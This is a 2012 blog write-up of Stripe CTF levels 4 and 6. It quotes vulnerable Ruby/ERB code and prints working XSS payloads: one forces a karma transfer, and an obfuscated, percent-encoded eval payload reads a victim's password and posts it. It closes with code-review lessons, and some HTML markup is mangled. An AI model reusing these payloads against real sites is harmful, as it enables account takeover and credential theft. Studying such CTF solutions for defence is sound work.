---
title: "Stripe CTF - XSS, CSRF (Levels 4 & 6)"
date: 2012-09-10
---
<div xmlns="http://www.w3.org/1999/xhtml"><div><p><a href="https://stripe-ctf.com/levels/4">Level 4</a> and <a href="https://stripe-ctf.com/levels/6">level 6</a> of the Stripe CTF had solutions around XSS.
  </p><h3>
    Level 4
  </h3><h4>
    Code
  </h4><pre><code>&gt; Registered Users <br /></code></pre><ul><br />
    &lt;%@registered_users.each do |user| %&gt;<br />
    &lt;%last_active = user[:last_active].strftime(&amp;apos;%H:%M:%S UTC&amp;apos;) %&gt;<br />
    &lt;%if @trusts_me.include?(user[:username]) %&gt;<br /><li><code><br />
      &lt;%= user[:username] %&gt;<br />
      (password: &lt;%= user[:password] %&gt;, last active &lt;%= last_active %&gt;)<br /></code></li><h4>
      Issue
    </h4><p>
      The level 4 web application lets you transfer karma to another user and in doing so you are also forced to expose your password to that user. The main user page displays a list of users who
      have transfered karma to you along with their password. The password is not HTML encoded so we can inject HTML into that user's browser. For instance, we could create an account with the
      following HTML as the password which will result in XSS with that HTML:
    </p><pre><code><script><![CDATA[
jQuery.post("https://level04-2.stripe-ctf.com/user-kxyiuircqs/transfer", {"to": "l", "amount": 1});
]]></script></code></pre>This HTML runs script that uses jQuery to post to the transfer URI resulting in a transfer of karma from the attacked user to the attacker user, and also the attacked user's
password.
    <h4>
      Notes
    </h4><p>
      Code review red flags in this case included lack of encoding when using user controlled content to create HTML content, storing passwords in plain text in the database, and displaying passwords
      generally. By design the web app shows users passwords which is a very bad idea.
    </p><h3>
      Level 6
    </h3><h4>
      Code
    </h4><pre><code><script><![CDATA[
 <br />    var username = "<%= @username %>"; <br />    var post_data = <%= @posts.to_json %>; <br /><br />    function escapeHTML(val) { <br />       return $(&amp;apos;<div/>&amp;apos;).text(val).html();<br />    } <br /><br />    function addPost(item) {<br />       var new_element = &amp;apos;<tr><th>&amp;apos; + escapeHTML(item[&amp;apos;user&amp;apos;]) + <br />          &amp;apos;</th><td><h4>&amp;apos; + escapeHTML(item[&amp;apos;title&amp;apos;]) + &amp;apos;</h4>&amp;apos; + <br />          escapeHTML(item[&amp;apos;body&amp;apos;]) + &amp;apos;</td></tr>&amp;apos;; $(&amp;apos;#posts > tbody:last&amp;apos;).prepend(new_element); <br />    } <br />    <br />    for(var i = 0; i < post_data.length; i++) { <br />       var item = post_data[i]; <br />       addPost(item); <br />    }; <br />
]]></script><br /><br />...<br /><br />    def self.safe_insert(table, key_values)<br />      key_values.each do |key, value|<br />        # Just in case people try to exfiltrate<br />        # level07-password-holder's password<br />        if value.kind_of?(String) &amp;&amp;<br />            (value.include?('"') || value.include?("'"))<br />          raise "Value has unsafe characters"<br />        end<br />      end<br /><br />      conn[table].insert(key_values)<br />    end</code></pre><h4>
      Issue
    </h4><p>
      This web app does a much better job than the level 4 app with HTML injection. They use encoding whenever creating HTML using user controlled data, however they don't use encoding when injecting
      JSON data into script (see post_data initialization above). This JSON data is the last five most recent messages sent on the app so we get to inject script directly. However, the system also
      ensures that no strings we write contains single or double quotes so we can't get out of the string in the JSON data directly. As it turns out, HTML lets you jump out of a script block using no
      matter where you are in script. For instance, in the middle of a value in some JSON data we can jump out of script. But we still want to run script, so we can jump right back in. So the frame
      so far for the message we're going to post is the following:
    </p><pre><script><![CDATA[
 our new code goes here 
]]></script><script><![CDATA[
var post_data = [];//</pre></code>Because we can't use quotes, actually running script takes some creativity.  I decided to percent-encode my script so quotes don't show up directly, represent this as a regular expression literal so I don't have to use quotes and to eval this script after decoding. There's likely plenty of other ways to get around lack of quotes.<code><pre>var code = /percent-encoded script here/.toString();<br />eval(decodeURIComponent(code.substring(1, code.length - 1))); </pre></code>Then the script I actually encode gets the password from the user-info page (which includes password), regexes the password out, and posts it as a message:<code><pre>jQuery.get("https://level06-2.stripe-ctf.com/user-nhboioztch/user_info").then(function(body) {<br />var password = /Password:<\/th>[^>]*>([^<]*)/.exec(body)[1];<br />var encPassword = "";<br />for (var idx = 0; idx < password.length; ++idx) {<br /> encPassword += "%";<br /> encPassword += password.charCodeAt(idx).toString(16);<br />}<br /><br />$("#content").val(encPassword);<br />$("#title").val("password");<br />document.getElementsByTagName("form")[0].submit();<br />});<br /></pre></code>Of course since messages can't include quotes, I have to encode the password before posting it as a message.</p><p>Altogether now here's my message:<code><pre>
]]></script><script><![CDATA[
var code = /%6A%51%75%65%72%79%2E%67%65%74%28%22%68%74%74%70%73%3A%2F%2F%6C%65%76%65%6C%30%36%2D%32%2E%73%74%72%69%70%65%2D%63%74%66%2E%63%6F%6D%2F%75%73%65%72%2D%6E%68%62%6F%69%6F%7A%74%63%68%2F%75%73%65%72%5F%69%6E%66%6F%22%29%2E%74%68%65%6E%28%66%75%6E%63%74%69%6F%6E%28%62%6F%64%79%29%20%7B%0A%76%61%72%20%70%61%73%73%77%6F%72%64%20%3D%20%2F%50%61%73%73%77%6F%72%64%3A%3C%5C%2F%74%68%3E%5B%5E%3E%5D%2A%3E%28%5B%5E%3C%5D%2A%29%2F%2E%65%78%65%63%28%62%6F%64%79%29%5B%31%5D%3B%0A%76%61%72%20%65%6E%63%50%61%73%73%77%6F%72%64%20%3D%20%22%22%3B%0A%66%6F%72%20%28%76%61%72%20%69%64%78%20%3D%20%30%3B%20%69%64%78%20%3C%20%70%61%73%73%77%6F%72%64%2E%6C%65%6E%67%74%68%3B%20%2B%2B%69%64%78%29%20%7B%0A%09%65%6E%63%50%61%73%73%77%6F%72%64%20%2B%3D%20%22%25%22%3B%0A%09%65%6E%63%50%61%73%73%77%6F%72%64%20%2B%3D%20%70%61%73%73%77%6F%72%64%2E%63%68%61%72%43%6F%64%65%41%74%28%69%64%78%29%2E%74%6F%53%74%72%69%6E%67%28%31%36%29%3B%0A%7D%0A%0A%24%28%22%23%63%6F%6E%74%65%6E%74%22%29%2E%76%61%6C%28%65%6E%63%50%61%73%73%77%6F%72%64%29%3B%0A%24%28%22%23%74%69%74%6C%65%22%29%2E%76%61%6C%28%22%70%61%73%73%77%6F%72%64%22%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%54%61%67%4E%61%6D%65%28%22%66%6F%72%6D%22%29%5B%30%5D%2E%73%75%62%6D%69%74%28%29%3B%0A%7D%29%3B/.toString(); eval(decodeURIComponent(code.substring(1, code.length - 1))); 
]]></script><script><![CDATA[
var post_data= [];//</pre></code></p><h4>Notes</h4><p>Code review red flags included storing the password in plain text, displaying the password in an HTML page, lack of encoding when generating script on the server side, and a deny list of dangerous characters (quotes). Generally folks should use allow lists not deny lists.  You'll always forget something from your deny list or the platform will change out from under you adding new dangerous entries you didn't consider in your deny list.  In this case an allow list probably also doesn't make as much sense as encoding correctly. The first issue I ran into, was when posting the password I forgot to encode and the password did contain quotes. The second issue I ran into was that my injected script posts a message which results in a page refresh, which results in my injected script running again. This continues five times until my injected script message is pushed off the end. I had to be patient waiting for the target attacked user to login before I would refresh and post my own password.</p></div>
]]></script></pre></ul></div></div>
